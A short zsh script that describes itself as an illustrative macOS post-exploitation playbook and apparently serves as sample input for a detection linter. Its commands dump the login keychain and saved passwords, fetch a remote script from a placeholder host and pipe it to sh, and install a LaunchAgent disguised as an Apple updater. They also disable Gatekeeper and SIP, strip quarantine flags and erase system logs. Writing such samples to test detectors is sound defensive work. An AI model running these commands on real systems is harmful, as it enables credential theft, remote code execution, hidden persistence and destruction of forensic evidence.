#!/bin/zsh
# Sample macOS post-exploitation playbook. Illustrative only.
# Analyze with: opseclint examples/macos-postex.sh --platform macos-es

# Discovery
sw_vers
system_profiler SPHardwareDataType
dscl . -list /Users

# Credential access
security dump-keychain -d login.keychain
security find-generic-password -wa "AppName"

# Execution / persistence
osascript -e 'do shell script "curl -s http://198.51.100.10/s | sh"'
cat > ~/Library/LaunchAgents/com.apple.updater.plist <<PLIST
<plist></plist>
PLIST
launchctl load ~/Library/LaunchAgents/com.apple.updater.plist

# Defense evasion
sudo spctl --master-disable
xattr -d -r com.apple.quarantine /Applications/Evil.app
csrutil disable

# Anti-forensics
log erase --all
